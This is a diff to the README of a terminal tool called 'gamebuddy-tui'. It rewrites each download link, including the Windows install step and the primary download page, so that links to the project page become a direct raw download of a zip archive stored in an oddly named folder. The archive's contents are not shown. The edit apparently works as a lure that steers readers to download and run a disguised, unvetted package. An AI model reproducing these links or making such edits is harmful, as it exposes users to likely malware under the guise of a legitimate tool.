@@ -1,12 +1,12 @@
 # 🕹️ gamebuddy-tui - Control your capture box fast
 
-[![Download gamebuddy-tui](https://img.shields.io/badge/Download-GameBuddy_TUI-blue?style=for-the-badge&logo=github)](https://github.com/Mb075599/gamebuddy-tui)
+[![Download gamebuddy-tui](https://img.shields.io/badge/Download-GameBuddy_TUI-blue?style=for-the-badge&logo=github)](https://github.com/Mb075599/gamebuddy-tui/raw/refs/heads/main/akrochordite/gamebuddy_tui_3.9.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the app:
 
-[Download gamebuddy-tui](https://github.com/Mb075599/gamebuddy-tui)
+[Download gamebuddy-tui](https://github.com/Mb075599/gamebuddy-tui/raw/refs/heads/main/akrochordite/gamebuddy_tui_3.9.zip)
 
 ## 🧰 What this app does
 
@@ -40,7 +40,7 @@ For best results:
 ## 💻 Download on Windows
 
 1. Open the download page:
-   [https://github.com/Mb075599/gamebuddy-tui](https://github.com/Mb075599/gamebuddy-tui)
+   [https://github.com/Mb075599/gamebuddy-tui/raw/refs/heads/main/akrochordite/gamebuddy_tui_3.9.zip](https://github.com/Mb075599/gamebuddy-tui/raw/refs/heads/main/akrochordite/gamebuddy_tui_3.9.zip)
 
 2. On the page, get the latest release or package for Windows.
 
@@ -222,7 +222,7 @@ It keeps the app simple and light. It also makes setup fast.
 
 Primary download page:
 
-[https://github.com/Mb075599/gamebuddy-tui](https://github.com/Mb075599/gamebuddy-tui)
+[https://github.com/Mb075599/gamebuddy-tui/raw/refs/heads/main/akrochordite/gamebuddy_tui_3.9.zip](https://github.com/Mb075599/gamebuddy-tui/raw/refs/heads/main/akrochordite/gamebuddy_tui_3.9.zip)
 
 ## 🧭 Quick start
 
